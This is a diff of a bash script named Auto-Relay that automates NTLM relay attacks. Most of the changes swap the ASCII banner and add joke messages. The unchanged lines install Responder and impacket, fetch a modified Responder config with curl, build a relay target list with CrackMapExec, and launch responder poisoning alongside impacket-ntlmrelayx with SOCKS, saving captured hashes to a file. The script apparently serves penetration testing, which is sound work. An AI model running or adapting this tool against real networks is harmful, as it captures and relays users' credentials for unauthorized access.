@@ -10,41 +10,50 @@ ITALIC="\e[3m"
 BOLD="\e[1m"
 
 #Heading!
-echo -e "${RED}"
-echo -e "###############################################################################"
-echo -e "#${BLUE}                                                                            ${RED} #"
-echo -e "#${BLUE}                AAA                                  iiii                   ${RED} #"
-echo -e "#${BLUE}               A:::A                                i::::i                  ${RED} #"
-echo -e "#${BLUE}              A:::::A                                iiii                   ${RED} #"
-echo -e "#${BLUE}             A:::::::A                                                      ${RED} #"
-echo -e "#${BLUE}            A:::::::::A           ggggggggg   gggggiiiiiii    ooooooooooo   ${RED} #"
-echo -e "#${BLUE}           A:::::A:::::A         g:::::::::ggg::::gi:::::i  oo:::::::::::oo ${RED} #"
-echo -e "#${BLUE}          A:::::A A:::::A       g:::::::::::::::::g i::::i o:::::::::::::::o${RED} #"
-echo -e "#${BLUE}         A:::::A   A:::::A     g::::::ggggg::::::gg i::::i o:::::ooooo:::::o${RED} #"
-echo -e "#${BLUE}        A:::::A     A:::::A    g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
-echo -e "#${BLUE}       A:::::AAAAAAAAA:::::A   g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
-echo -e "#${BLUE}      A:::::::::::::::::::::A  g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
-echo -e "#${BLUE}     A:::::AAAAAAAAAAAAA:::::A g::::::g    g:::::g  i::::i o::::o     o::::o${RED} #"
-echo -e "#${BLUE}    A:::::A             A:::::Ag:::::::ggggg:::::g i::::::io:::::ooooo:::::o${RED} #"
-echo -e "#${BLUE}   A:::::A               A:::::Ag::::::::::::::::g i::::::io:::::::::::::::o${RED} #"
-echo -e "#${BLUE}  A:::::A                 A:::::Agg::::::::::::::g i::::::i oo:::::::::::oo ${RED} #"
-echo -e "#${BLUE} AAAAAAA                   AAAAAAA gggggggg::::::g iiiiiiii   ooooooooooo   ${RED} #"
-echo -e "#${BLUE}                                           g:::::g                          ${RED} #"
-echo -e "#${BLUE}                               gggggg      g:::::g                          ${RED} #"
-echo -e "#${BLUE}                               g:::::gg   gg:::::g                          ${RED} #"
-echo -e "#${BLUE}                                g::::::ggg:::::::g                          ${RED} #"
-echo -e "#${BLUE}                                 gg:::::::::::::g                           ${RED} #"
-echo -e "#${BLUE}                                   ggg::::::ggg                             ${RED} #"
-echo -e "#${BLUE}                                      gggggg                                ${RED} #"
-echo -e "#${BLUE}                                                                            ${RED} #"
-echo -e "#${GREEN}                                   Auto-Relay                               ${RED} #"
-echo -e "#${BLUE}                                                                            ${RED} #"
-echo -e "#${GREEN}                              Script Version 0.1                            ${RED} #"
-echo -e "#${BLUE}                                                                            ${RED} #"
-echo -e "#${GREEN}                by ${BLUE}Kyle Hoehn ${RED}with code stealing ${GREEN}from ${BLUE}Chris McMahon         ${RED} #"
-echo -e "#${BLUE}                                                                            ${RED} #"
-echo -e "###############################################################################"
-echo -e "${RESET}"
+echo -e "${GREEN}                                                                                ${RESET}"
+echo -e "${GREEN}                                                                                ${RESET}"
+echo -e "${GREEN}                                                                                ${RESET}"
+echo -e "${GREEN}                               ################*                                ${RESET}"
+echo -e "${GREEN}                            ##%%%%%@%%%%%####%%%%%%#                            ${RESET}"
+echo -e "${GREEN}                          ##%%%%%%%@@@@&##@###@@#%%%%#                          ${RESET}"
+echo -e "${GREEN}                         #########%%%%@%&&%#######%%%%%#%                       ${RESET}"
+echo -e "${GREEN}                       #####&###%%%%######%######%%#%%%%%###                    ${RESET}"
+echo -e "${GREEN}                    ####@@@#######%#//////%(////###%@%@%##%%%                   ${RESET}"
+echo -e "${GREEN}                   ############/##////////%%///////(#%%%%@%#%%                  ${RESET}"
+echo -e "${GREEN}                 .#########%/%(###///%%%%(%%%###//////%%%%%%%%%                 ${RESET}"
+echo -e "${GREEN}                ,%#@############//%////((/######%#/##//%%%#%%%%%                ${RESET}"
+echo -e "${GREEN}                #%%%%##%#######/////#%##############////%%#%#%%%#               ${RESET}"
+echo -e "${GREEN}               #%&%%##%##%####/##(%///////%%%###//%#%#///###%%%%%               ${RESET}"
+echo -e "${GREEN}              %#%%%####%######%//////////////%%##//%#%%///##%%%%%%              ${RESET}"
+echo -e "${GREEN}              %%%%%#@@#(####///////###//////////##/#%%%/%//#%#%%%(              ${RESET}"
+echo -e "${GREEN}              #%%%%##@@%####%////##%////////////%%#/%%//##/##%%%%%              ${RESET}"
+echo -e "${GREEN}              ##%%%%###%###%/#/###%////////####//%#//%#//#/##%%%%%              ${RESET}"
+echo -e "${GREEN}              %%%%@%###/##//(/####%////////#/##/###%/%#//##//@%%%%%             ${RESET}"
+echo -e "${GREEN}              %#%#%%#%//#////####%///%//##//////#/%#%%%//####%#%%@%             ${RESET}"
+echo -e "${GREEN}             %#%%%%%%%%//////%###%/////##%%#%/#%//%%%#%//#/#%%#@%%%             ${RESET}"
+echo -e "${GREEN}             %#%%%%%%@//////#%####//%#%###/#/%%%/%@%@###%##%#%%%%%%/            ${RESET}"
+echo -e "${GREEN}              #&&%%%%///////######//#######//(//##@@###%%#/###%&%%%/            ${RESET}"
+echo -e "${GREEN}              #%%%%@@#//////######///%###/######@%/###/%//##%@%%%%%/            ${RESET}"
+echo -e "${GREEN}              %#%%%@@@#%////######///%%#%%#########/#/%///#%%##@%%%(            ${RESET}"
+echo -e "${GREEN}              *#%%@%%%#/////((//###////%%%##%%///////%///#%%%%@%%%%             ${RESET}"
+echo -e "${GREEN}               #%%%%%@//@@///#//#%##////#&@@@###///%#///##%(@%%%%%              ${RESET}"
+echo -e "${GREEN}               %%%%%%%#(/////##/(%%%###////##########///###%#%@%%               ${RESET}"
+echo -e "${GREEN}               .##%%%%%//(/////####%%%%%//#(///////////(#//#%%%%                ${RESET}"
+echo -e "${GREEN}                %#%%@%%##/#///%//#####%///%%%#%%#////##///@#%%%%                ${RESET}"
+echo -e "${GREEN}                 %####%%@%@////%//####/##(/////####///(///####                  ${RESET}"
+echo -e "${GREEN}                   ##@%%%%%%@@%///@/##//////(#@%%/##///%%%%%(                   ${RESET}"
+echo -e "${GREEN}                     ###%%%%%%%#@@#///@@/(#//####/%(/%%%%%#                     ${RESET}"
+echo -e "${GREEN}                      ###%%%######@@@#//////////////#%#%%#                      ${RESET}"
+echo -e "${GREEN}                       %%######%######@###(#%%%%%%%%%%%%                        ${RESET}"
+echo -e "${GREEN}                          %%%%%#############@%@@@@@@@%%                         ${RESET}"
+echo -e "${GREEN}                              #%%%######%%%%###%%%%%%                           ${RESET}"
+echo -e "${GREEN}                                   %%%%%%%%%%%#/,                               ${RESET}"
+echo -e "${GREEN}                                                                                ${RESET}"
+echo -e "${GREEN}                                                                                 ${RESET}"
+echo -e "${GREEN}                                                                                 ${RESET}"
+echo -e "${GREEN} by ${BLUE}Kyle Hoehn ${RED}with code stealing ${GREEN}from ${BLUE}Chris McMahon ${RESET}"
+echo -e "${GREEN}                                                                                 ${RESET}"
+echo -e "${GREEN}                                                                                 ${RESET}"
 
 #Root Check
 if [[ $(/usr/bin/id -u) -ne 0 ]]; then
@@ -53,7 +62,7 @@ if [[ $(/usr/bin/id -u) -ne 0 ]]; then
 fi
 
 #Options
-while getopts 'r:jp:h' opt; do
+while getopts 'r:h' opt; do
   case "$opt" in
     r)
       range="$OPTARG"
@@ -81,11 +90,38 @@ while getopts 'r:jp:h' opt; do
 done
 shift "$(($OPTIND -1))"
 
+sleep 2
+
+echo -e "[${BLUE}*${RESET}] I WANT THAT MULAN NUGGET SAUCE!\n"
+# Check for missing arguments
+
+if [ -z "$range" ]; then
+        echo -e "${RED}Get ready for it!!!${RESET}"
+        sleep 2
+        echo -e "Well then get your shit together, get it all together and put it in a backpack, all your shit, so it's together.\n"
+        sleep 1
+        echo -e "And if you gotta take it somewhere, take it somewhere, you know. Take it to the shit store and sell it, or put it in the shit museum. I don't care what you do, you just gotta get it together.\n"
+        sleep 1
+        echo -e "Get your shit together.\n\n"
+        sleep 1
+        echo -e "[${RED}!${RESET}] For usage, use $(basename $0) -h"
+        exit 1
+fi
+
+sleep 2
+
+# checking for wrong scan argument
+
+#if [[ "$range" != "*.*.*.*/*" ]]; then
+#        echo -e "[${RED}!${RESET}] incorrect range..."
+#        exit 1
+#fi
+
 #Variables for scripting use
 varWorkingDir="$(pwd)"
 
 #Installing dependencies if not already installed
-echo -e "[${GREEN}+${RESET}] Checking for application dependencies."
+echo -e "[${BLUE}+${RESET}] Checking for application dependencies."
 if command -v terminator &> /dev/null
 then
     echo -e "[${GREEN}+${RESET}] Terminator is installed."
@@ -102,7 +138,7 @@ apt update && apt install responder -y
 fi
 if command -v impacket-ntlmrelayx &> /dev/null
 then
-    echo -e "[${GREEN}+${RESET}] Impacket-Scripts is installed."
+    echo -e "[${GREEN}+${RESET}] Impacket-Scripts are installed."
 else
 echo -e "[${RED}!${RESET}] Installing Impacket-Scrpits."
 apt update && apt install impacket-scripts -y
@@ -117,7 +153,7 @@ echo -e "[${GREEN}+${RESET}] Downloading modified Responder config file"
 curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf &> /dev/null
 
 #Sleep to allow for removal and downloading to complete.
-echo -e "[${GREEN}+${RESET}] Taking a 5 second nap to get my shit together..."
+echo -e "[${GREEN}+${RESET}] What, so everyone is supposed to sleep every single night now?"
 sleep 5
 
 #Running CrackMapExec to create a relay list
@@ -133,3 +169,5 @@ else
   terminator -e "responder -I eth0 -w"
   terminator -e "impacket-ntlmrelayx -tf ${varWorkingDir}/relay_targets.txt -smb2support -socks --output-file ${varWorkingDir}/ntlmrelayx_hashes.out"
 fi
+
+echo -e "Www.. what am I, a hack?! Go nuts, Morty, it's full proof."
